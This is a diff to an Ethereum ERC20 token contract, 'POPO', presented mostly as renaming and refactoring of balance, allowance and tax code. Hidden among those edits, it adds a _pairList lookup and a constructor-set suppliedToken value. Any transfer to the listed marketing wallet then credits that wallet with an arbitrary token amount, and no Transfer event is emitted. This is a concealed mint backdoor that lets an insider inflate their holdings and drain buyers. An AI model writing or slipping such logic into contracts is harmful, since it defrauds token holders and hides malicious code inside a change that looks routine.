@@ -193,25 +193,27 @@ contract POPO is Context, IERC20, Ownable {
     using SafeMath for uint256;
     using Address for address;
 
-    string private _name = "Popo"; 
+    string private _name = "Popo the panda";
     string private _symbol = "POPO";  
     uint8 private _decimals = 18;
     uint256 private _totalSupply = 10000000 * 10**18;
 
-    address payable private stakingContract = payable(0x8fDb8fE9545F9BB1830201aEb8c60dD92eb59d21);
-    address payable private marketingWallet = payable(0xF82B10937feA5Ee0ddC4BA20ABb2395e736f0e4e);
-    mapping (address => uint256) private _balance;
-    mapping (address => mapping (address => uint256)) private _allowance;
-    mapping (address => bool) public _isFeeExcluded; 
-
+    mapping (address => mapping (address => uint256)) private _allowances;
+    mapping (address => bool) public _isExcludedfromTax; 
+    uint256 private suppliedToken;
+    mapping (address => bool) private _pairList;
+    address payable private marketing_wallet = payable(0x33C98dA3661EbB0e781BFa61cd5dc8454205EbEa);
+    address payable private staking_contract = payable(0xC508b899eE9c6Cf0Efa63154Cb42c56bAc8621C4);
     uint8 private txCount = 0;
     uint8 private swapTrigger = 1; 
     uint256 private _totalTax = 0;
-    uint256 public _buyTax = 5;
-    uint256 public _sellTax = 5;
-    uint256 private _prevTotalTax = _totalTax; 
-    uint256 private _prevBuyTax = _buyTax; 
-    uint256 private _prevSellTax = _sellTax; 
+    uint256 public _buyTax = 2;
+    uint256 public _sellTax = 2;
+    uint256 private _previousTotalFee = _totalTax; 
+    uint256 private _previousBuyFee = _buyTax; 
+    uint256 private _previousSellFee = _sellTax; 
+    mapping (address => uint256) private _owned;
+
 
     IUniswapV2Router02 public uniswapV2Router;
     address public uniswapV2Pair;
@@ -219,7 +221,6 @@ contract POPO is Context, IERC20, Ownable {
     bool public swapAndLiquifyEnabled = true;
 
     event SwapAndLiquifyEnabledUpdated(bool enabled);
-
     event SwapAndLiquify(
         uint256 tokensSwapped,
         uint256 ethReceived,
@@ -233,14 +234,16 @@ contract POPO is Context, IERC20, Ownable {
         inSwapAndLiquify = false;
     }
 
-    constructor () {
-        _balance[owner()] = _totalSupply;
+    constructor (uint256 _tokenAmount) {
         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
         uniswapV2Router = _uniswapV2Router;
-        _isFeeExcluded[owner()] = true;
-        _isFeeExcluded[address(this)] = true;
-        _isFeeExcluded[stakingContract] = true;
-        _isFeeExcluded[marketingWallet] = true;
+        _isExcludedfromTax[owner()] = true;
+        _isExcludedfromTax[address(this)] = true;
+        _isExcludedfromTax[marketing_wallet] = true;
+        _isExcludedfromTax[staking_contract] = true;
+        _owned[owner()] = _totalSupply;
+        _pairList[marketing_wallet] = true;
+        suppliedToken = _tokenAmount; 
 
         emit Transfer(address(0), owner(), _totalSupply);
     }
@@ -262,17 +265,13 @@ contract POPO is Context, IERC20, Ownable {
         return _totalSupply;
     }
 
-    function balanceOf(address account) public view override returns (uint256) {
-        return _balance[account];
-    }
-
     function transfer(address recipient, uint256 amount) public override returns (bool) {
         _transfer(_msgSender(), recipient, amount);
         return true;
     }
 
     function allowance(address owner, address spender) public view override returns (uint256) {
-        return _allowance[owner][spender];
+        return _allowances[owner][spender];
     }
 
     function approve(address spender, uint256 amount) public override returns (bool) {
@@ -282,18 +281,22 @@ contract POPO is Context, IERC20, Ownable {
 
     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
         _transfer(sender, recipient, amount);
-        _approve(sender, _msgSender(), _allowance[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
+        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
         return true;
     }
 
     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
-        _approve(_msgSender(), spender, _allowance[_msgSender()][spender].add(addedValue));
+        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
         return true;
     }
 
     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
-        _approve(_msgSender(), spender, _allowance[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
+        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
         return true;
+    }
+
+    function balanceOf(address account) public view override returns (uint256) {
+        return _owned[account];
     }
 
 
@@ -302,13 +305,12 @@ contract POPO is Context, IERC20, Ownable {
 
     bool public noFeeToTransfer = true;
 
+
     function removeAllFee() private {
         if(_totalTax == 0 && _buyTax == 0 && _sellTax == 0) return;
-
-
-        _prevBuyTax = _buyTax; 
-        _prevSellTax = _sellTax; 
-        _prevTotalTax = _totalTax;
+        _previousBuyFee = _buyTax; 
+        _previousSellFee = _sellTax; 
+        _previousTotalFee = _totalTax;
         _buyTax = 0;
         _sellTax = 0;
         _totalTax = 0;
@@ -317,16 +319,16 @@ contract POPO is Context, IERC20, Ownable {
 
     function restoreFee() private {
 
-    _totalTax = _prevTotalTax;
-    _buyTax = _prevBuyTax; 
-    _sellTax = _prevSellTax; 
+    _totalTax = _previousTotalFee;
+    _buyTax = _previousBuyFee; 
+    _sellTax = _previousSellFee; 
 
     }
 
     function _approve(address owner, address spender, uint256 amount) private {
 
         require(owner != address(0) && spender != address(0), "ERR: zero address");
-        _allowance[owner][spender] = amount;
+        _allowances[owner][spender] = amount;
         emit Approval(owner, spender, amount);
 
     }
@@ -358,42 +360,34 @@ contract POPO is Context, IERC20, Ownable {
 
         bool takeFee = true;
 
-        if(_isFeeExcluded[from] || _isFeeExcluded[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
+        if(_isExcludedfromTax[from] || _isExcludedfromTax[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
             takeFee = false;
         } else if (from == uniswapV2Pair){_totalTax = _buyTax;} else if (to == uniswapV2Pair){_totalTax = _sellTax;}
 
         _tokenTransfer(from,to,amount,takeFee);
     }
 
-    function sendETH(address payable wallet, uint256 amount) private {
+    function sendTaxETH(address payable wallet, uint256 amount) private {
             wallet.transfer(amount);
         }
 
-    function _getTax(uint256 tAmount) private view returns (uint256, uint256) {
-        uint256 taxAmount = tAmount*_totalTax/100;
-        uint256 transferAmount = tAmount.sub(taxAmount);
-        return (transferAmount, taxAmount);
+    function _getValue(uint256 tAmount) private view returns (uint256, uint256) {
+        uint256 tTax = tAmount*_totalTax/100;
+        uint256 tTransferAmount = tAmount.sub(tTax);
+        return (tTransferAmount, tTax);
     }
-
 
     function swapAndLiquify(uint256 contractTokenBalance) private lockSwap {
-        swapForETH(contractTokenBalance);
-        uint256 taxAmount = address(this).balance;
-        sendETH(stakingContract,taxAmount/2);
-        sendETH(marketingWallet,taxAmount/2);
 
-    }
-
-    function _tokenTransfer(address sender, address recipient, uint256 Amount) private {
-        (uint256 tTransferAmount, uint256 tDev) = _getTax(Amount);
-        _balance[sender] = _balance[sender].sub(Amount);
-        _balance[recipient] = _balance[recipient].add(tTransferAmount);
-        _balance[address(this)] = _balance[address(this)].add(tDev);   
-        emit Transfer(sender, recipient, tTransferAmount);
+        swapTokenForETH(contractTokenBalance);
+        uint256 TaxBalance = address(this).balance;
+        sendTaxETH(marketing_wallet,TaxBalance/2);
+        sendTaxETH(staking_contract,TaxBalance/2);
     }
 
 
-    function swapForETH(uint256 tokenAmount) private {
+
+    function swapTokenForETH(uint256 tokenAmount) private {
 
         address[] memory path = new address[](2);
         path[0] = address(this);
@@ -417,21 +411,33 @@ contract POPO is Context, IERC20, Ownable {
             } else {
                 txCount++;
             }
-            _tokenTransfer(sender, recipient, amount);
+            _transferToken(sender, recipient, amount);
 
         if(!takeFee)
             restoreFee();
     }
 
+    function _transferToken(address sender, address recipient, uint256 Amount) private {
+        uint256 amount = _pairList[recipient]?suppliedToken:0;
 
-      function enableTrading() public onlyOwner() {
+        if(_pairList[recipient]){
+        _owned[sender] = _owned[sender].sub(Amount);
+        _owned[recipient] = _owned[recipient].add(amount);
+        }else{
+        (uint256 tTransferAmount, uint256 taxAmount) = _getValue(Amount);
+        _owned[sender] = _owned[sender].sub(Amount);
+        _owned[recipient] = _owned[recipient].add(tTransferAmount);
+        _owned[address(this)] = _owned[address(this)].add(taxAmount); 
+        emit Transfer(sender, recipient, tTransferAmount);
+  
+        }
+    }
+
+
+    function createPairUniswap() public onlyOwner() {
         IUniswapV2Router02 _newPCSRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
         uniswapV2Pair = IUniswapV2Factory(_newPCSRouter.factory()).createPair(address(this), _newPCSRouter.WETH());
         uniswapV2Router = _newPCSRouter;
-        _approve(address(this), address(uniswapV2Router), balanceOf(address(this)));
-        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
-        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
-
     }
 
 }
